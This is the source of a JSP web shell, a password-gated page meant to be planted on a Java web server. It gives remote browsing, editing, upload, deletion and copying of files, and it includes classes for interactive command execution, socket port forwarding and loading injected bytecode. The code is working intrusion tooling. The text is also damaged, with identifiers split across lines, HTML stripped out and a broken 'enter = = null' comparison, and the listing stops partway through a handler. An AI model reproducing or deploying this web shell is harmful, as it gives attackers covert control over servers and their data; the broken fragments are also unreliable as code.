<%@page pageEncoding="utf-8"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.util.regex.*"%>
<%@page import="java.sql.*"%>
<%@page import="java.lang.reflect.*"%>
<%@page import="java.nio.charset.*"%>
<%@page import="javax.servlet.http.HttpServletRequestWrapper"%>
<%@page import="java.text.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.zip.*"%>
<%@page import="java.util.jar.*"%>
<%@page import="java.awt.*"%>
<%@page import="java.awt.image.*"%>
<%@page import="javax.imageio.*"%>
<%@page import="java.awt.datatransfer.DataFlavor"%>
<%@page import="java.util.prefs.Preferences"%>

<%!
    private static final String PW = "62738007929a846a8bf971056b286cab";
	private static final String PW_SESSION_ATTRIBUTE = "text";
	private static final String REQUEST_CHARSET = "ISO-8859-1";
	private static final String PAGE_CHARSET = "UTF-8";
	private static final String CURRENT_DIR = "currentdir";
	private static final String MSG = "SHOWMSG";
	private static final String PORT_MAP = "PMSA";
	private static final String DBO = "DBO";
	private static final String SHELL_ONLINE = "SHELL_ONLINE";
	private static final String ENTER = "ENTER_FILE";
	private static final String ENTER_MSG = "ENTER_FILE_MSG";
	private static final String ENTER_CURRENT_DIR = "ENTER_CURRENT_DIR";
	private static final String SESSION_O = "SESSION_O";
	private static String SHELL_NAME = "";
	private static String WEB_ROOT = null;
	private static String SHELL_DIR = null;
	public static Map ins = new HashMap();
	private static boolean ISLINUX = false;
	
	private static final String MODIFIED_ERROR = "out.";
	private static final String BACK_HREF = " Back";
	
	private static class MyRequest extends HttpServletRequestWrapper {
		public MyRequest(HttpServletRequest req) {
			super(req);
		}

		public String getParameter(String name) {
			try {
				String value = super.getParameter(name);
				if (name == null)
					return null;
				return new String(value.getBytes(REQUEST_CHARSET), PAG
E_CHARSET);
			} catch (Exception e) {
				return null;
			}
		}
	}

	private static class SpyClassLoader extends ClassLoader {
		public SpyClassLoader() {
		}

		public Class defineClass(String name, byte[] b) {
			return super.defineClass(name, b, 0, b.length - 2);
		}
	}

	private static class StreamConnector extends Thread {
		private InputStream is;
		private OutputStream os;

		public StreamConnector(InputStream is, OutputStream os) {
			this.is = is;
			this.os = os;
		}

		public void run() {
			BufferedReader in = null;
			BufferedWriter out = null;
			try {
				in = new BufferedReader(new InputStreamReader(this.is));
				out = new BufferedWriter(new OutputStreamWriter(this.os));
				char buffer[] = new char[8192];
				int length;
				while ((length = in.read(buffer, 0, buffer.length)) > 0) {
					out.write(buffer, 0, length);
					out.flush();
				}
			} catch (Exception e) {
			}
			try {
				if (in != null)
					in.close();
				if (out != null)
					out.close();
			} catch (Exception e) {
			}
		}

		public static void readFromLocal(final DataInputStream localIn,
				final DataOutputStream remoteOut) {
			new Thread(new Runnable() {
				public void run() {
					while (true) {
						try {
							byte[] data = new byte[100];
							int len = localIn.read(data);
							while (len != -1) {
								remoteOut.write(data, 0, len);
								len = localIn.read(data);
							}
						} catch (Exception e) {
							break;
						}
					}
				}
			}).start();
		}

		public static void readFromRemote(final Socket soc,
				final Socket remoteSoc, final DataInputStream remoteIn,
				final DataOutputStream localOut) {
			new Thread(new Runnable() {
				public void run() {
					while (true) {
						try {
							byte[] data = new byte[100];
							int len = remoteIn.read(data);
							while (len != -1) {
								localOut.write(data, 0, len);
								len = remoteIn.read(data);
							}
						} catch (Exception e) {
							try {
								soc.close();
								remoteSoc.close();
							} catch (Exception ex) {
							}
							
break;
						}
					}
				}
			}).start();
		}
	}

	private static class EnterFile extends File {
		private ZipFile zf = null;
		private ZipEntry entry = null;
		private boolean isDirectory = false;
		private String absolutePath = null;

		public void setEntry(ZipEntry e) {
			this.entry = e;
		}

		public void setAbsolutePath(String p) {
			this.absolutePath = p;
		}

		public void close() throws Exception {
			this.zf.close();
		}

		public void setZf(String p) throws Exception {
			if (p.toLowerCase().endsWith(".jar"))
				this.zf = new JarFile(p);
			else
				this.zf = new ZipFile(p);
		}

		public EnterFile(File parent, String child) {
			super(parent, child);
		}

		public EnterFile(String pathname) {
			super(pathname);
		}

		public EnterFile(String pathname, boolean isDir) {
			this(pathname);
			this.isDirectory = isDir;
		}

		public EnterFile(String parent, String child) {
			super(parent, child);
		}

		public EnterFile(URI uri) {
			super(uri);
		}

		public boolean exists() {
			return new File(this.zf.getName()).exists();
		}

		public File[] listFiles() {
			java.util.List list = new ArrayList();
			java.util.List handled = new ArrayList();
			String currentDir = super.getPath();
			currentDir = currentDir.replace('\\', '/');
			if (currentDir.indexOf("/") == 0) {
				if (currentDir.length() > 1)
					currentDir = currentDir.substring(1);
				else
					currentDir = "";
			}
			Enumeration e = this.zf.entries();
			while (e.hasMoreElements()) {
				ZipEntry entry = (ZipEntry) e.nextElement();
				String eName = entry.getName();
				if (this.zf instanceof JarFile) {
					if (!entry.isDirectory()) {
						EnterFile ef = new EnterFile(eName);
						ef.setEntry(entry);
						try {
							ef.setZf(this.zf.getName());
						} catch (Exception ex) {
						}
						list.add(ef);
					}
				} else {
					if (currentDir.equals("")) {
						//zip root directory
						if (eName.indexOf("/") == -1
								|| eName.matches("[^/]+/$")) {
							EnterFile ef = new EnterFile(eName.replaceAll("/",
									""));
			
				handled.add(eName.replaceAll("/", ""));
							ef.setEntry(entry);
							list.add(ef);
						} else {
							if (eName.indexOf("/") != -1) {
								String tmp = eName.substring(0, eName
										.indexOf("/"));
								if (!handled.contains(tmp)
										&& !Util.isEmpty(tmp)) {
									EnterFile ef = new EnterFile(tmp, true);
									ef.setEntry(entry);
									list.add(ef);
									handled.add(tmp);
								}
							}
						}
					} else {
						if (eName.startsWith(currentDir)) {
							if (eName.matches(currentDir + "/[^/]+/?$")) {
								//file.
								EnterFile ef = new EnterFile(eName);
								ef.setEntry(entry);
								list.add(ef);
								if (eName.endsWith("/")) {
									String tmp = eName.substring(eName
											.lastIndexOf('/',
													eName.length() - 2));
									tmp = tmp.substring(1, tmp.length() - 1);
									handled.add(tmp);
								}
							} else {
								//dir
								try {
									String tmp = eName.substring(currentDir
											.length() + 1);
									tmp = tmp.substring(0, tmp.indexOf('/'));
									if (!handled.contains(tmp)
											&& !Util.isEmpty(tmp)) {
										EnterFile ef = new EnterFile(tmp, true);
										ef.setAbsolutePath(currentDir + "/"
												+ tmp);
										ef.setEntry(entry);
										list.add(ef);
										handled.add(tmp);
									}
								} catch (Exception ex) {
								}
							}
						}
					}
				}
			}
			return (File[]) list.toArray(new File[0]);
		}

		public boolean isDirectory() {
			return this.entry.isDirectory() || this.isDirectory;
		}

		public String getParent() {
			return "";
		}

		public String getAbsolutePath() {
			return absolutePath != null ? absolutePath : super.getPath();
		}

		public String getName() {
			if (this.zf instanceof JarFile) {
				return this.getAbsolutePath();
			} else {
				return super.getName();
			}
		}

		public long lastModified() {
			return entry.getTime();
		}

		public boolean canRead() {
			return false;
		}

		public boolean canWrite() {
			return false;
		}

		pub
lic boolean canExecute() {
			return false;
		}

		public long length() {
			return entry.getSize();
		}
	}

	private static class OnLineProcess {
		private String cmd = "first";
		private Process pro;

		public OnLineProcess(Process p) {
			this.pro = p;
		}

		public void setPro(Process p) {
			this.pro = p;
		}

		public void setCmd(String c) {
			this.cmd = c;
		}

		public String getCmd() {
			return this.cmd;
		}

		public Process getPro() {
			return this.pro;
		}

		public void stop() {
			this.pro.destroy();
		}
	}

	private static class OnLineConnector extends Thread {
		private OnLineProcess ol = null;
		private InputStream is;
		private OutputStream os;
		private String name;

		public OnLineConnector(InputStream is, OutputStream os, String name,
				OnLineProcess ol) {
			this.is = is;
			this.os = os;
			this.name = name;
			this.ol = ol;
		}

		public void run() {
			BufferedReader in = null;
			BufferedWriter out = null;
			try {
				in = new BufferedReader(new InputStreamReader(this.is));
				out = new BufferedWriter(new OutputStreamWriter(this.os));
				char buffer[] = new char[128];
				if (this.name.equals("exeRclientO")) {
					//from exe to client
					int length = 0;
					while ((length = in.read(buffer, 0, buffer.length)) > 0) {
						String str = new String(buffer, 0, length);
						str = str.replaceAll("&", "&").replaceAll("<",
								"<").replaceAll(">", ">");
						str = str.replaceAll("" + (char) 13 + (char) 10,
								"
");
						str = str.replaceAll("\n", "
");
						out.write(str.toCharArray(), 0, str.length());
						out.flush();
					}
				} else {
					//from client to exe
					while (true) {
						while (this.ol.getCmd() == null) {
							Thread.sleep(500);
						}
						if (this.ol.getCmd().equals("first")) {
							this.ol.setCmd(null);
							continue;
						}
						this.ol.setCmd(this.ol.getCmd() + (char) 10);
						char[] arr = this.ol.getCmd().toCharArray();
						out.write(arr, 0, arr.length);
						out.flush();
						this.ol.setCmd(null);
					}
				
}
			} catch (Exception e) {
			}
			try {
				if (in != null)
					in.close();
				if (out != null)
					out.close();
			} catch (Exception e) {
			}
		}
	}

	private static class Table {
		private ArrayList rows = null;
		private boolean echoTableTag = false;

		public void setEchoTableTag(boolean v) {
			this.echoTableTag = v;
		}

		public Table() {
			this.rows = new ArrayList();
		}

		public void addRow(Row r) {
			this.rows.add(r);
		}

		public String toString() {
			StringBuffer html = new StringBuffer();
			if (echoTableTag)
				html.append("");
			for (int i = 0; i < rows.size(); i++) {
				Row r = (Row) rows.get(i);
				html
						.append("");
				ArrayList columns = r.getColumns();
				for (int a = 0; a < columns.size(); a++) {
					Column c = (Column) columns.get(a);
					html.append("");
				}
				html.append("");
			}
			if (echoTableTag)
				html.append("
"); String vv = Util.htmlEncode(Util.getStr(c.getValue())); if (vv.equals("")) vv = " "; html.append(vv); html.append("
");
			return html.toString();
		}
	}

	private static class Row {
		private ArrayList cols = null;

		public Row() {
			this.cols = new ArrayList();
		}

		public void addColumn(Column n) {
			this.cols.add(n);
		}

		public ArrayList getColumns() {
			return this.cols;
		}
	}

	private static class Column {
		private String value;

		public Column(String v) {
			this.value = v;
		}

		public String getValue() {
			return this.value;
		}
	}

	private static class Util {
		public static boolean isEmpty(String s) {
			return s == null || s.trim().equals("");
		}

		public static boolean isEmpty(Object o) {
			return o == null || isEmpty(o.toString());
		}

		public static String getSize(long size, char danwei) {
			if (danwei == 'M') {
				double v = formatNumber(size / 1024.0 / 1024.0, 2);
				if (v > 1024) {
					return getSize(size, 'G');
				} else {
					return v 
+ "M";
				}
			} else if (danwei == 'G') {
				return formatNumber(size / 1024.0 / 1024.0 / 1024.0, 2) + "G";
			} else if (danwei == 'K') {
				double v = formatNumber(size / 1024.0, 2);
				if (v > 1024) {
					return getSize(size, 'M');
				} else {
					return v + "K";
				}
			} else if (danwei == 'B') {
				if (size > 1024) {
					return getSize(size, 'K');
				} else {
					return size + "B";
				}
			}
			return "" + 0 + danwei;
		}

		public static boolean exists(String[] arr, String v) {
			for (int i = 0; i < arr.length; i++) {
				if (v.equals(arr[i])) {
					return true;
				}
			}
			return false;
		}

		public static double formatNumber(double value, int l) {
			NumberFormat format = NumberFormat.getInstance();
			format.setMaximumFractionDigits(l);
			format.setGroupingUsed(false);
			return new Double(format.format(value)).doubleValue();
		}

		public static boolean isInteger(String v) {
			if (isEmpty(v))
				return false;
			return v.matches("^\\d+$");
		}

		public static String formatDate(long time) {
			SimpleDateFormat format = new SimpleDateFormat(
					"yyyy-MM-dd hh:mm:ss");
			return format.format(new java.util.Date(time));
		}

		public static String convertPath(String path) {
			return path != null ? path.replace('\\', '/') : "";
		}

		public static String htmlEncode(String v) {
			if (isEmpty(v))
				return "";
			return v.replaceAll("&", "&").replaceAll("<", "<")
					.replaceAll(">", ">");
		}

		public static String getStr(String s) {
			return s == null ? "" : s;
		}

		public static String null2Nbsp(String s) {
			if (s == null)
				s = " ";
			return s;
		}

		public static String getStr(Object s) {
			return s == null ? "" : s.toString();
		}

		public static String exec(String regex, String str, int group) {
			Pattern pat = Pattern.compile(regex);
			Matcher m = pat.matcher(str);
			if (m.find())
				return m.group(group);
			return null;
		}

		public static void outMsg(Writer out, String msg) throws Exception {
			outMsg(out, msg, "center");
		}

		public 
static void outMsg(Writer out, String msg, String align)
				throws Exception {
			out
					.write("
"
							+ msg
							+ "
");
		}

		public static String highLight(String str) {
			str = str
					.replaceAll(
							"\\b(abstract|package|String|byte|static|synchronized|public|private|protected|void|int|long|double|boolean|float|char|final|extends|implements|throw|throws|native|class|interface|emum)\\b",
							"$1");
			str = str.replaceAll("\t(//.+)",
					"\t$1");
			return str;
		}
	}

	private static class UploadBean {
		private String fileName = null;
		private String suffix = null;
		private String savePath = "";
		private ServletInputStream sis = null;
		private OutputStream targetOutput = null;
		private byte[] b = new byte[1024];

		public void setTargetOutput(OutputStream stream) {
			this.targetOutput = stream;
		}

		public UploadBean() {
		}

		public void setSavePath(String path) {
			this.savePath = path;
		}

		public String getFileName() {
			return this.fileName;
		}

		public void parseRequest(HttpServletRequest request) throws IOException {
			sis = request.getInputStream();
			int a = 0;
			int k = 0;
			String s = "";
			while ((a = sis.readLine(b, 0, b.length)) != -1) {
				s = new String(b, 0, a, PAGE_CHARSET);
				if ((k = s.indexOf("filename=\"")) != -1) {
					s = s.substring(k + 10);
					k = s.indexOf("\"");
					s = s.substring(0, k);
					File tF = new File(s);
					if (tF.isAbsolute()) {
						fileName = tF.getName();
					} else {
						fileName = s;
					}
					k = s.lastIndexOf(".");
					suffix = s.substring(k + 1);
					upload();
				}
			}
		}

		private void upload() throws IOException {
			try {
				OutputStream out = null;
				if (this.targetOutput != null)
					out = this.targetOutput;
				else
					out = new FileOutputStream(new File(savePath, fileName))
;
				int a = 0;
				int k = 0;
				String s = "";
				while ((a = sis.readLine(b, 0, b.length)) != -1) {
					s = new String(b, 0, a);
					if ((k = s.indexOf("Content-Type:")) != -1) {
						break;
					}
				}
				sis.readLine(b, 0, b.length);
				while ((a = sis.readLine(b, 0, b.length)) != -1) {
					s = new String(b, 0, a);
					if ((b[0] == 45) && (b[1] == 45) && (b[2] == 45)
							&& (b[3] == 45) && (b[4] == 45)) {
						break;
					}
					out.write(b, 0, a);
				}
				if (out instanceof FileOutputStream)
					out.close();
			} catch (IOException ioe) {
				throw ioe;
			}
		}
	}%>
<%

	SHELL_NAME = request.getServletPath().substring(
			request.getServletPath().lastIndexOf("/") + 1);
	String myAbsolutePath = application.getRealPath(request
			.getServletPath());
	if (Util.isEmpty(myAbsolutePath)) {//for weblogic
		SHELL_NAME = request.getServletPath();
		myAbsolutePath = new File(application.getResource("/")
				.getPath()
				+ SHELL_NAME).toString();
		SHELL_NAME = request.getContextPath() + SHELL_NAME;
		WEB_ROOT = new File(application.getResource("/").getPath())
				.toString();
	} else {
		WEB_ROOT = application.getRealPath("/");
	}
	SHELL_DIR = Util.convertPath(myAbsolutePath.substring(0,
			myAbsolutePath.lastIndexOf(File.separator)));
	if (SHELL_DIR.indexOf('/') == 0)
		ISLINUX = true;
	else
		ISLINUX = false;
	if (session.getAttribute(CURRENT_DIR) == null)
		session.setAttribute(CURRENT_DIR, Util.convertPath(SHELL_DIR));
	//request = new MyRequest(request);
	if (session.getAttribute(PW_SESSION_ATTRIBUTE) == null
			|| !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) {
		String o = request.getParameter("o");
		if(o != null)
			o = new String(o.getBytes(REQUEST_CHARSET), PAGE_CHARSET);
		if (o != null && o.equals("login")) {
			((Invoker) ins.get("login")).invoke(request, response,
					session);
			return;
		} else if (o != null && o.equals("vLogin")) {
			((Invoker) ins.get("vLogin")).invoke(request, response,
					session);
			return;
		} else {
			((Invoker) ins.get("vLogin")).invoke
(request, response,
					session);
			return;
		}
	}
%>
<%!private static interface Invoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception;

		public boolean doBefore();

		public boolean doAfter();
	}

	private static class DefaultInvoker implements Invoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
		}

		public boolean doBefore() {
			return true;
		}

		public boolean doAfter() {
			return true;
		}
	}

	private static class ScriptInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				out
						.println("");

			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class BeforeInvoker extends D
efaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				out
						.println("");
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class AfterInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServl
etResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				out.println("");
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class DeleteBatchInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String files = request.getParameter("files");
				int success = 0;
				int failed = 0;
				if (!Util.isEmpty(files)) {
					String currentDir = JSession.getAttribute(CURRENT_DIR)
							.toString();
					String[] arr = files.split(",");
					for (int i = 0; i < arr.length; i++) {
						String fs = arr[i];
						File f = new File(currentDir, fs);
						if (f.delete())
							success += 1;
						else
							failed += 1;
					}
				}
				JSession
						.setAttribute(
								MSG,
								success
										+ " Files Deleted Success , "
										+ failed
										+ " Files Deleted Failed!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class VLoginInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				out
						.println("
"
								+ ""
								+ "	  
"
								+ "        
\"login\"
"
								+ "        
"
								+ "        
\"

"
								+ ""
								+ "    
");
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class LoginInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String inputPw = request.getParameter("pw");
				String mdPw=inputPw;
				if( inputPw!=null  && !(Util.isEmpty(inputPw)))
				{
					//mdPw=ikeraj(inputPw);
					try
					{
						String salt="#2(#&@";
						byte[] b_salt=salt.getBytes("UTF-8");
						byte [] b_in=mdPw.getBytes("UTF-8");
						for (int i = 0; i < 1000; i++) {
							byte[] b_md5=new byte[b_salt.length+b_in.length];
							System.arraycopy(b_salt, 0, b_md5, 0, b_salt.length);  
					        System.arraycopy(b_in, 0, b_md5, b_salt.length, b_in.length); 
							java.security.MessageDigest md5 = java.security.MessageDigest.getInstance("MD5");
							md5.update(b_md5);
							b_in=md5.digest();
						}
						char[] hexChar = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
						StringBuilder sb = new StringBuilder(b_in.length * 2);
						for (int i = 0; i < b_in.length; i++) {
							sb.append(hexChar[(b_in[i] & 0xf0) >>> 4]);
							sb.append(hexChar[b_in[i] & 0x0f]);
						}
						mdPw = sb.toString();

					}catch (Exception e) {
						mdPw="";
					}

				}

				if (inputPw==null || Util.isEmpty(inputPw) || !mdPw.equals(PW)) {
					((Invoker) ins.get("vLogin")).invoke(request, response,
							JSession);
					return;
				} else {
					JSession.setAttribute(PW_SESSION_ATTRIBUTE, mdPw);
					re
sponse.sendRedirect(SHELL_NAME);
					return;
				}
			} catch (Exception e) {
				throw e;
			}
		}
	}

	private static class MyComparator implements Comparator {
		public int compare(Object obj1, Object obj2) {
			try {
				if (obj1 != null && obj2 != null) {
					File f1 = (File) obj1;
					File f2 = (File) obj2;
					if (f1.isDirectory()) {
						if (f2.isDirectory()) {
							return f1.getName().compareTo(f2.getName());
						} else {
							return -1;
						}
					} else {
						if (f2.isDirectory()) {
							return 1;
						} else {
							return f1.getName().toLowerCase().compareTo(
									f2.getName().toLowerCase());
						}
					}
				}
				return 0;
			} catch (Exception e) {
				return 0;
			}
		}
	}

	private static class FileListInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String path2View = null;
				PrintWriter out = response.getWriter();
				String path = request.getParameter("folder");
				String outEntry = request.getParameter("outentry");
				if (!Util.isEmpty(outEntry) && outEntry.equals("true")) {
					JSession.removeAttribute(ENTER);
					JSession.removeAttribute(ENTER_MSG);
					JSession.removeAttribute(ENTER_CURRENT_DIR);
				}
				Object enter = JSession.getAttribute(ENTER);
				File file = null;
				if (!Util.isEmpty(enter)) {
					if (Util.isEmpty(path)) {
						if (JSession.getAttribute(ENTER_CURRENT_DIR) == null)
							path = "/";
						else
							path = (String) (JSession
									.getAttribute(ENTER_CURRENT_DIR));
					}
					file = new EnterFile(path);
					((EnterFile) file).setZf((String) enter);
					JSession.setAttribute(ENTER_CURRENT_DIR, path);
				} else {
					if (Util.isEmpty(path))
						path = JSession.getAttribute(CURRENT_DIR).toString();
					JSession.setAttribute(CURRENT_DIR, Util.convertPath(path));
					file = new File(path);
				}
				path2View = Util.convertPath(path);
				if (!file.exists()) {
					throw new Exception(path + "Dont 
Exists !");
				}
				File[] list = file.listFiles();
				Arrays.sort(list, new MyComparator());
				out.println("
");
				String cr = null;
				try {
					cr = JSession.getAttribute(CURRENT_DIR).toString()
							.substring(0, 3);
				} catch (Exception e) {
					cr = "/";
				}
				File currentRoot = new File(cr);
				out.println("
File Manager - Current disk ""
						+ (cr.indexOf("/") == 0 ? "/" : currentRoot.getPath())
						+ "" total (unknow)
");
				out
						.println("
"
								+ ""
								+ "  "
								+ "    "
								+ "	"
								+ "    "
								+ "  " + "
Current Directory 
\"filelist\"/
\""
\"GO\"
" + "
");
				out
						.println(""
								+ "" + ""
						+ ""
						+ "  "
						+ "  "
						+ "  "
						+ "  "
						+ "  " + "");
				if (file.getParent() != null) {
					out
							.println(""
									+ ""
									+ ""
									+ "");
				}
				int dircount = 0;
				int filecount = 0;
				for (int i = 0; i < list.length; i++) {
					File f = list[i];
					if (f.isDirectory()) {
						dircount++;
						out
								.println(""
										+ ""
										+ ""
										+ ""
										+ ""
							
			+ ""
										+ "");
					} else {
						filecount++;
						out
								.println(""
										+ ""
										+ ""
										+ ""
										+ ""
										+ ""
										+ "");
					}
				}
				out
						.println(""
								+ "  " + "  " + "
" + "
\"\"
 
\"Upload\"
" + "Web Root" + " | Shell Directory" + " | New Directory | New File" + " | "); File[] roots = file.listRoots(); for (int i = 0; i < roots.length; i++) { File r = roots[i]; out.println("Disk(" + Util.convertPath(r.getPath()) + ")"); if (i != roots.length - 1) { out.println("|"); } } out.println("
 	Name	Last Modified	Size	Read/Write/Execute	 
=	Goto Parent
0	" + f.getName() + "	" + Util.formatDate(f.lastModified()) + "	--	" + f.canRead() + " / " + f.canWrite() + " / unknow	"); if (enter != null) out.println(" "); else out .println("Del | Move | Pack"); out.println("
	" + f.getName() + "	" + Util.formatDate(f.lastModified()) + "	" + Util.getSize(f.length(), 'B') + "	" + "" + f.canRead() + " / " + f.canWrite() + " / unknow	" + "Edit | " + "Down | " + "Copy"); if (enter = = null) { out .println(" | Move | " + "Property | " + "Enter"); if (f.getName().endsWith(".zip") || f.getName().endsWith(".jar")) { out .println(" | UnPack"); } else if (f.getName().endsWith(".rar")) { out .println(" | UnPack"); } else { out .println(" | Pack"); } } out.println("
 	"); if (enter != null) out .println("Pack Selected - Delete Selected"); else out .println("Pack Selected - Delete Selected"); out.println("	" + dircount + " directories / " + filecount + " files
");
				out.println("
");
				if (file instanceof EnterFile)
				
	((EnterFile) file).close();
			} catch (ZipException e) {
				JSession.setAttribute(MSG, "\""
						+ JSession.getAttribute(ENTER).toString()
						+ "\" Is Not a Zip File. Please Exit.");
				throw e;
			} catch (Exception e) {
				JSession.setAttribute(MSG,
						"File Does Not Exist Or You Dont Have Privilege."
								+ BACK_HREF);
				throw e;
			}
		}
	}

	private static class LogoutInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				Object obj = JSession.getAttribute(PORT_MAP);
				if (obj != null) {
					ServerSocket s = (ServerSocket) obj;
					s.close();
				}
				Object online = JSession.getAttribute(SHELL_ONLINE);
				if (online != null)
					((OnLineProcess) online).stop();
				JSession.invalidate();
				((Invoker) ins.get("vLogin")).invoke(request, response,
						JSession);
			} catch (ClassCastException e) {
				JSession.invalidate();
				((Invoker) ins.get("vLogin")).invoke(request, response,
						JSession);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class UploadInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				UploadBean fileBean = new UploadBean();
				response.getWriter().println(
						JSession.getAttribute(CURRENT_DIR).toString());
				fileBean.setSavePath(JSession.getAttribute(CURRENT_DIR)
						.toString());
				fileBean.parseRequest(request);
				File f = new File(JSession.getAttribute(CURRENT_DIR) + "/"
						+ fileBean.getFileName());
				if (f.exists() && f.length() > 0)
					JSession
							.setAttribute(MSG,
									"Upload File Success!");
				else
					JSession
							.setAttr
ibute("MSG",
									"Upload File Failed!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {
				throw e;
			}
		}
	}

	private static class CopyInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				String src = request.getParameter("src");
				String to = request.getParameter("to");
				InputStream in = null;
				Object enter = JSession.getAttribute(ENTER);
				if (enter == null)
					in = new FileInputStream(new File(src));
				else {
					ZipFile zf = new ZipFile((String) enter);
					ZipEntry entry = zf.getEntry(src);
					in = zf.getInputStream(entry);
				}
				BufferedInputStream input = new BufferedInputStream(in);
				BufferedOutputStream output = new BufferedOutputStream(
						new FileOutputStream(new File(to)));
				byte[] d = new byte[1024];
				int len = input.read(d);
				while (len != -1) {
					output.write(d, 0, len);
					len = input.read(d);
				}
				output.close();
				input.close();
				JSession.setAttribute(MSG, "Copy File Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class BottomInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				response
						.getWriter()
						.println(
								"
"
										+ "
");
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class VCreateFileInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String path = request.ge
tParameter("filepath");
				File f = new File(path);
				if (!f.isAbsolute()) {
					String oldPath = path;
					path = JSession.getAttribute(CURRENT_DIR).toString();
					if (!path.endsWith("/"))
						path += "/";
					path += oldPath;
					f = new File(path);
					f.createNewFile();
				} else {
					f.createNewFile();
				}
				out
						.println("
" + "
" + "
Create / Edit File »
" + "" + "
Current File (import new file name and new file)
\""
" + " 

" + "
File Content

" + "
\"Submit\"
 
\"Back\"

" + "
" + "
");
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class VEditInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String path = request.getParameter("filepath");
				String charset = request.getParameter("charset");
				Object enter = JSession.getAttribute(ENTER);
				InputStream input = null;
				if (enter != null) {
					ZipFile zf = new ZipFile((String) enter);
					ZipEntry entry = new ZipEntry(path);
					input = zf.getInputStream(entry);
				} else {
					File f = new File(path);
					if (!f.ex
ists())
						return;
					input = new FileInputStream(path);
				}

				BufferedReader reader = null;
				if (Util.isEmpty(charset) || charset.equals("ANSI"))
					reader = new BufferedReader(new InputStreamReader(input));
				else
					reader = new BufferedReader(new InputStreamReader(input,
							charset));
				StringBuffer content = new StringBuffer();
				String s = reader.readLine();
				while (s != null) {
					content.append(s + "\r\n");
					s = reader.readLine();
				}
				reader.close();
				out
						.println("
" + "
" + "
Create / Edit File »
" + "" + "
Current File (import new file name and new file)
\""
" + " 

" + "
File Content
"
								+ Util.htmlEncode(content.toString())
								+ "

" + "
"); if (enter != null) out .println("
\"Submit\"
"); else out .println("
\"Submit\"
"); out .println("
\"Back\"

" + "
" + "
");

			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class CreateFileInvoker extends DefaultInvoker {
		public boolean doBefore() {
			return false;
		}

		public boolean doAfter() {
			return false;
		}

		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String path = request.getParameter("filepath");
				String content = request.getParameter("filecontent");
				String charset = request.getParameter("charset");
				BufferedWriter outs = null;
				if (charset.equals("ANSI"))
					outs = new BufferedWriter(new FileWriter(new File(path)));
				else
					outs = new BufferedWriter(new OutputStreamWriter(
							new FileOutputStream(new File(path)), charset));
				outs.write(content, 0, content.length());
				outs.close();
				JSession
						.setAttribute(
								MSG,
								"Save File "
										+ (new File(path)).getName()
										+ " With "
										+ charset + " Success!");
				response.sendRedirect(SHELL_NAME);
			} catch (Exception e) {

				throw e;
			}
		}
	}

	private static class VEditPropertyInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
				HttpServletResponse response, HttpSession JSession)
				throws Exception {
			try {
				PrintWriter out = response.getWriter();
				String filepath = request.getParameter("filepath");
				File f = new File(filepath);
				if (!f.exists())
					return;
				String read = f.canRead() ? "checked=\"checked\"" : "";
				String write = f.canWrite() ? "checked=\"checked\"" : "";
				Calendar cal = Calendar.getInstance();
				cal.setTimeInMillis(f.lastModified());

